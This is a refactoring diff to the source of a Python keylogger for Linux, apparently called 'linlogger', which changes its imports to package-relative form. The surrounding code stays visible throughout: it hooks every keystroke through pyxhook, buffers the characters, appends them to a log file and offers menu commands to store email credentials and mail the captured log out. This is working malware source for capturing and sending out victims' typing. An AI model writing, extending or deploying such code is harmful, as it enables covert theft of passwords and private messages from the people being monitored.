@@ -7,9 +7,11 @@ import sys
 import clipboard
 import pyxhook
 
-from mailing import *
-from cli import *
-from files.management import *
+from . import (
+    cli,
+    mailing,
+)
+from .files import management
 
 
 LINLOGGER_FILE = os.path.abspath(os.path.basename(__file__))
@@ -58,7 +60,7 @@ def keyboard_event(event):
 
     # avoid opening file so often
     if len(char_list) > 100:
-        append_to_file(LOG_FILE, char_list)
+        management.append_to_file(LOG_FILE, char_list)
 
         # check if user do not want to copy anything
         if char_list[-1] != 'CONTROL_L' or char_list[-1] != 'CONTROL_R':
@@ -73,9 +75,9 @@ def start_normally():
         hook_manager.KeyDown = keyboard_event
         hook_manager.HookKeyboard()
         hook_manager.start()
-        message_to_screen('Started in normal mode', True)
+        cli.message_to_screen('Started in normal mode', True)
     else:
-        message_to_screen('Script is already running', False)
+        cli.message_to_screen('Script is already running', False)
 
 
 def stop():
@@ -85,9 +87,9 @@ def stop():
         hook_manager.cancel()
         hook_manager = None
         save_data()
-        message_to_screen('Keylogging stopped', True)
+        cli.message_to_screen('Keylogging stopped', True)
     else:
-        message_to_screen('Script must be running', False)
+        cli.message_to_screen('Script must be running', False)
 
 
 def catch_signals():
@@ -104,7 +106,7 @@ def catch_signals():
 def save_data():
     global char_list
 
-    append_to_file(LOG_FILE, char_list)
+    management.append_to_file(LOG_FILE, char_list)
     char_list = []
 
 
@@ -119,25 +121,24 @@ def linlogger_quit(signum=None, frame=None):
 
 
 def main():
-    menu()
+    cli.menu()
     options = {
         'start': start_normally,
-        'set_email': set_credentials,
-        'check_email': check_credentials,
-        'send_log': functools.partial(send_file, LOG_FILE),
-        'check_log': functools.partial(read_file, LOG_FILE),
-        'remove_log': functools.partial(clean_file, LOG_FILE),
+        'set_email': mailing.set_credentials,
+        'check_email': mailing.check_credentials,
+        'send_log': functools.partial(mailing.send_file, LOG_FILE),
+        'check_log': functools.partial(management.read_file, LOG_FILE),
+        'remove_log': functools.partial(management.clean_file, LOG_FILE),
         'stop': stop,
-        'help': hints,
+        'help': cli.hints,
         'quit': linlogger_quit,
     }
 
     while True:
         catch_signals()
         user_choice = input('\n> ')
-        options.get(user_choice, invalid_command)()
+        options.get(user_choice, cli.invalid_command)()
 
 
 if __name__ == '__main__':
     main()
-
